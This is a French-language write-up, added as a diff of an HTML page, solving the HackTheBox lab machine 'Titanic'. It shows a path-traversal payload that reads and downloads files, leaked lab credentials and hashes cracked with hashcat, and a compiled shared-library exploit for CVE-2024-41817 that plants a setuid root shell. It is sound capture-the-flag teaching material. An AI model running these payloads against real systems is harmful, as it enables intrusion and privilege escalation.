@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Titanic | Writeup</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Titanic" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Nooo don’t turn 25 you’re so cute haha" />
+<meta property="og:description" content="Nooo don’t turn 25 you’re so cute haha" />
+<link rel="canonical" href="/HTB/season7/titanic.html" />
+<meta property="og:url" content="/HTB/season7/titanic.html" />
+<meta property="og:site_name" content="Writeup" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-04-14T11:26:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Titanic" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-04-14T11:26:00+02:00","datePublished":"2026-04-14T11:26:00+02:00","description":"Nooo don’t turn 25 you’re so cute haha","headline":"Titanic","mainEntityOfPage":{"@type":"WebPage","@id":"/HTB/season7/titanic.html"},"url":"/HTB/season7/titanic.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Titanic</h1>
+      <h2 class="project-tagline">Nooo don't turn 25 you're so cute haha</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="outline">Outline</h1>
+<h2 id="foothold">Foothold</h2>
+<ul>
+  <li>Le site principal présente une LFI.</li>
+  <li>Le sous-domaine <code class="language-plaintext highlighter-rouge">dev.titanic.htb</code> présente plusieurs repo gitea <code class="language-plaintext highlighter-rouge">developer</code> avec des infos:
+    <ul>
+      <li>La configuration docker de la base de données, avec les identifiants.</li>
+      <li>Les fichiers python du site gitea avec l’emplacement du <code class="language-plaintext highlighter-rouge">root</code>.</li>
+    </ul>
+  </li>
+  <li>Le premier site permet de lire le fichier de configuration et trouver l’emplacement de la db.</li>
+  <li>A nouveau la LFI permet d’exfiltrer la db et les identifiants récupérés précédemment de s’y connecter pour lire les hash de mots de passe.</li>
+  <li>Les hashs de mots de passe sont stockés en pbkdf2, après une manip rapide on peut les cracker facilement.</li>
+  <li>Cela nous donne accès à <code class="language-plaintext highlighter-rouge">developer</code>, dont on avait déjà croisé le nom et le travail avant.
+    <h2 id="privesc-to-root">PrivEsc to root</h2>
+  </li>
+  <li>Certains dossiers sont modifiables par nous, notamment un dossier dans lequel est exécuté un script.</li>
+  <li>Ce script fait appel à une version vulnérable de magick dont <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8" class="web-link">CVE-2024-41817</a> permet d’en abuser et donne l’accès root.</li>
+</ul>
+
+<h1 id="foothold-1">Foothold</h1>
+
+<p>Les ports ouverts sont les classiques: <code class="language-plaintext highlighter-rouge">80</code> et <code class="language-plaintext highlighter-rouge">22</code>.</p>
+
+<p>Le site est très simple en soi.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/titanic%20images/Pasted%20image%2020260414114104.png"></span></p>
+
+<p>Il permet notamment de s’inscrire pour la croisière:</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/titanic%20images/Pasted%20image%2020260414114233.png"></span></p>
+
+<p>Et ensuite un lien est envoyé pour télécharger le fichier avec notre ticket <code class="language-plaintext highlighter-rouge">/download?ticket=7aaaab96-e010-4386-b863-f3dbe1c494a9.json</code>. En changeant cette valeur il est possible de télécharger le fichier que l’on souhaite:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/download?ticket=../../../etc/passwd
+</code></pre></div></div>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/titanic%20images/Pasted%20image%2020260414114355.png"></span></p>
+
+<p>Cette vulnérabilite est un path traversal doublé d’une local file inclusion, cela nous permet de lire les fichiers du système.</p>
+
+<p>Avec cela il est possible de savoir que <code class="language-plaintext highlighter-rouge">developer</code> est utilisateur avec un <code class="language-plaintext highlighter-rouge">/home</code>.</p>
+
+<p>Pour ceux qui auraient loupé le sous-domaine <code class="language-plaintext highlighter-rouge">dev.titanic.htb</code>. La page principale ne montre pas grand chose, elle permet de s’inscrire et se login. Elle montre aussi la version du site, <code class="language-plaintext highlighter-rouge">1.22.1</code>, qui s’avère finalement inutile (seule une XSS est possible).</p>
+
+<p>Une fois inscrit sur le site, n’importe qui a accès aux repos de <code class="language-plaintext highlighter-rouge">developer</code>, qui contiennent des identifiants:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>version: '3.8'
+
+services:
+  mysql:
+    image: mysql:8.0
+    container_name: mysql
+    ports:
+      - "127.0.0.1:3306:3306"
+    environment:
+      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
+      MYSQL_DATABASE: tickets 
+      MYSQL_USER: sql_svc
+      MYSQL_PASSWORD: sql_password
+    restart: always
+</code></pre></div></div>
+<p>Ainsi qu’un fichier de configuration gitea:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>version: '3'
+
+services:
+  gitea:
+    image: gitea/gitea
+    container_name: gitea
+    ports:
+      - "127.0.0.1:3000:3000"
+      - "127.0.0.1:2222:22"  # Optional for SSH access
+    volumes:
+      - /home/developer/gitea/data:/data # Replace with your path
+    environment:
+      - USER_UID=1000
+      - USER_GID=1000
+    restart: always
+</code></pre></div></div>
+<p>Et pour couronner le tout le code de l’application flask</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
+import os
+import json
+from uuid import uuid4
+
+app = Flask(__name__)
+
+TICKETS_DIR = "tickets"
+
+if not os.path.exists(TICKETS_DIR):
+    os.makedirs(TICKETS_DIR)
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/book', methods=['POST'])
+def book_ticket():
+    data = {
+        "name": request.form['name'],
+        "email": request.form['email'],
+        "phone": request.form['phone'],
+        "date": request.form['date'],
+        "cabin": request.form['cabin']
+    }
+
+    ticket_id = str(uuid4())
+    json_filename = f"{ticket_id}.json"
+    json_filepath = os.path.join(TICKETS_DIR, json_filename)
+
+    with open(json_filepath, 'w') as json_file:
+        json.dump(data, json_file)
+
+    return redirect(url_for('download_ticket', ticket=json_filename))
+
+@app.route('/download', methods=['GET'])
+def download_ticket():
+    ticket = request.args.get('ticket')
+    if not ticket:
+        return jsonify({"error": "Ticket parameter is required"}), 400
+
+    json_filepath = os.path.join(TICKETS_DIR, ticket)
+
+    if os.path.exists(json_filepath):
+        return send_file(json_filepath, as_attachment=True, download_name=ticket)
+    else:
+        return jsonify({"error": "Ticket not found"}), 404
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000)
+</code></pre></div></div>
+
+<p>Dans le dossier de tickets deux tickets sont déjà créés, ce qui permet de récupérer des identifiants:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}
+</code></pre></div></div>
+<p>et</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}
+</code></pre></div></div>
+
+<p>Les identifiants donnés jusqu’à maintenant:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">jack.dawson@titanic.htb</code></li>
+  <li><code class="language-plaintext highlighter-rouge">rose.bukater@titanic.htb</code></li>
+  <li><code class="language-plaintext highlighter-rouge">developer:developer@titanic.htb</code></li>
+  <li>identifiants sql <code class="language-plaintext highlighter-rouge">root:MySQLP@$$w0rd!@tickets</code>
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>mysql -u root -pMySQLP@$$w0rd! -h localhost tickets -e "select * from users;" -E
+</code></pre></div>    </div>
+  </li>
+  <li>chemin de base de gitea
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>/home/developer/gitea/data
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>A partir de ces infos il est possible aussi de lire le fichier <code class="language-plaintext highlighter-rouge">/home/developer/gitea/data/gitea/conf/app.ini</code> pour y trouver quelques infos.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[server]
+APP_DATA_PATH = /data/gitea
+DOMAIN = gitea.titanic.htb
+SSH_DOMAIN = gitea.titanic.htb
+HTTP_PORT = 3000
+ROOT_URL = http://gitea.titanic.htb/
+DISABLE_SSH = false
+SSH_PORT = 22
+SSH_LISTEN_PORT = 22
+LFS_START_SERVER = true
+LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
+OFFLINE_MODE = true
+
+[database]
+PATH = /data/gitea/gitea.db
+DB_TYPE = sqlite3
+HOST = localhost:3306
+NAME = gitea
+USER = root
+PASSWD = 
+LOG_SQL = false
+SCHEMA = 
+SSL_MODE = disable
+
+[security]
+INSTALL_LOCK = true
+SECRET_KEY = 
+REVERSE_PROXY_LIMIT = 1
+REVERSE_PROXY_TRUSTED_PROXIES = *
+INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
+PASSWORD_HASH_ALGO = pbkdf2
+
+[oauth2]
+JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
+</code></pre></div></div>
+
+<p>Cette fois le fichier de configuration donne un indice sur la base de données, qu’il est possible de télécharger avec</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://titanic.htb/download\?ticket\=../../../home/developer/gitea/data/gitea/gitea.db -O gitea.db
+</code></pre></div></div>
+
+<p>Puis de lire dans sqlite3:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select * from user;
+</code></pre></div></div>
+<p>Pour obtenir.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
+
+2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
+
+3|guest|guest||email@email.com|0|enabled|76c0dfd39edbfb2111be60b71c7c33d645ed7a3b7295fb04357a60398b2d24a8860930be4bd89e9a032a50b8a0710d971184|pbkdf2$50000$50|0|0|0||0|||5e356ef176a4f33f118fa89d6c208b31|f6211670b5b38f54119066257b18f799|en-US||1776171040|1776171040|1776171040|0|-1|1|0|0|0|0|1|0|4f64c9f81bb0d4ee969aaf7b4a5a6f40|email@email.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
+</code></pre></div></div>
+
+<p>Il est possible de récupérer l’ordre de ces infos dans la base de données avec</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.schema user
+</code></pre></div></div>
+<p>Avec ça il est possible de trouver les hash et les salt:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "developer:sha256:50000:$(echo -n '8bf3e3452b78544f8bee9400d6936d34' | xxd -r -p | base64):$(echo -n 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56' | xxd -r -p | base64)" &gt; hashes.txt
+hashcat -a 0 -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt --username
+</code></pre></div></div>
+<p>(Il faut commencer avec <code class="language-plaintext highlighter-rouge">developer</code> ici, qui a l’air plus intéressant)</p>
+
+<p>Tout cela nous donne les identifiants <code class="language-plaintext highlighter-rouge">developer:25282528</code>, et ainsi l’accès ssh.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/titanic%20images/Pasted%20image%2020260414172351.png"></span></p>
+
+<h1 id="privesc-to-root-1">PrivEsc to root</h1>
+
+<p>linpeas remarque automatiquement deux dossiers dans lesquels on peut écrire:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/app/static/assets/images
+/opt/app/tickets
+</code></pre></div></div>
+<p>Et dans la partie des fichiers ajoutés par l’utilisateur, linpeas soulève</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/scripts/identify_images.sh
+</code></pre></div></div>
+<p>Fichier qui contient le code suivant:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify &gt;&gt; metadata.log
+</code></pre></div></div>
+
+<p>Le fichier <code class="language-plaintext highlighter-rouge">metadata.log</code> a d’ailleurs été modifié récemment, la dernière fois que l’on a interagit avec le site précisemment.</p>
+
+<p>Le script en lui-même n’est pas vulnérable en entier, il utilise magick dans une version qui est vulnérable à <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8" class="web-link">CVE-2024-41817</a> qui consiste à poser une librairie partagée dans le dossier d’exécution, dossier sur lequel on a des droits privilégiés.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+__attribute__((constructor)) void init(){
+    system("cp /bin/bash /tmp/rootshell; chmod 7777 /tmp/rootshell");
+    exit(0);
+}
+EOF
+</code></pre></div></div>
+
+<p>Et avec ça compilé dès le lancement du cron le shell sera créé et accessible.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/titanic%20images/Pasted%20image%2020260414185240.png"></span></p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/titanic%20images/Pasted%20image%2020260414185310.png"></span></p>
+
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
